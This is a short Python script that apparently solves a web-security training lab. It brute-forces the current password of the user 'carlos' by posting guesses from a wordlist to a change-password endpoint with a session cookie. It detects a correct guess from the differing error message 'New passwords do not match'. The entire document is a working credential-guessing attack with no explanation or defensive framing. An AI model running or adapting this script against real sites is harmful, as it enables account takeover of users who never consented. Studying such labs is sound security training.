import requests

TARGET_URL = "https://0a1f00fb04b531da82bd38c4009200ff.web-security-academy.net/my-account/change-password"
COOKIE = {"session": "SESSION_LO"}
USERNAME = "carlos"

def test_password(pwd):
    data = {
        "username": USERNAME,
        "current-password": pwd,
        "new-password-1": "xx",
        "new-password-2": "yy"
    }
    r = requests.post(TARGET_URL, data=data, cookies=COOKIE)
    return "New passwords do not match" in r.text

with open("passwords.txt") as f:
    for line in f:
        pwd = line.strip()
        if test_password(pwd):
            print("[FOUND]", pwd)
            break
